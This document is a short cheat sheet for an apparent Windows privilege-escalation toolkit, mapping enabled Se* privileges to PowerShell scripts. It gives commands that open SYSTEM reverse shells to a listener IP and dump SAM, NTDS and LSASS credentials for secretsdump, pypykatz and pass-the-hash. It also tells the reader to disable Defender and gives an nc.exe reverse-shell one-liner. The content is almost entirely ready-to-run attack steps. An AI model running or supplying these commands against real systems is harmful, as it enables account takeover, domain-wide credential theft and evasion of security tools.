# Se-Priv Abuse Toolkit

See a Se* privilege enabled? Run the matching script.

---

## Step 0 — Load the script (always do this first)

```powershell
. .\Invoke-SeWhateverAbuse.ps1
```

---

## SeRestorePrivilege → SYSTEM shell

```powershell
. .\Invoke-SeRestoreAbuse.ps1
Invoke-SeRestoreAbuse -Shell -LHOST 192.168.45.166 -LPORT 443
```
**Shell dies in ~30s** — immediately push a second shell from it to a second listener on 444.

---

## SeBackupPrivilege → hashes

```powershell
. .\Invoke-SeBackupAbuse.ps1

# Any Windows (local admin hash):
Invoke-SeBackupAbuse -Mode local -OutPath C:\tmp

# Domain Controller (ALL domain hashes):
Invoke-SeBackupAbuse -Mode dc -OutPath C:\tmp
```
Then on Kali:
```bash
# local:
impacket-secretsdump -sam C:\tmp\SAM -system C:\tmp\SYSTEM -security C:\tmp\SECURITY LOCAL
# DC:
impacket-secretsdump -ntds C:\tmp\ntds.dit -system C:\tmp\SYSTEM LOCAL
```
PTH with the Administrator hash.

---

## SeTakeOwnershipPrivilege → SYSTEM shell

```powershell
. .\Invoke-SeTakeOwnershipAbuse.ps1
Invoke-SeTakeOwnershipAbuse -Shell -LHOST 192.168.45.166 -LPORT 443
```

---

## SeDebugPrivilege → credentials

```powershell
. .\Invoke-SeDebugAbuse.ps1
Invoke-SeDebugAbuse
# dumps to C:\tmp\lsass.dmp
```
Then on Kali:
```bash
pypykatz lsa minidump lsass.dmp
```
AV will flag this — disable Defender first.

---

## Quick reference

| Privilege                | Script                       | Result       |
|--------------------------|------------------------------|--------------|
| SeRestorePrivilege       | Invoke-SeRestoreAbuse        | SYSTEM shell |
| SeBackupPrivilege        | Invoke-SeBackupAbuse         | NTLM hashes  |
| SeTakeOwnershipPrivilege | Invoke-SeTakeOwnershipAbuse  | SYSTEM shell |
| SeDebugPrivilege         | Invoke-SeDebugAbuse          | LSASS dump   |
| SeImpersonatePrivilege   | SigmaPotato / PrintSpoofer   | SYSTEM shell |

---

## Shell unstable fix

Second listener on Kali: `nc -nlvp 444`

From the initial SYSTEM shell immediately run:
```powershell
C:\tmp\nc.exe YOUR_IP 444 -e powershell.exe
```
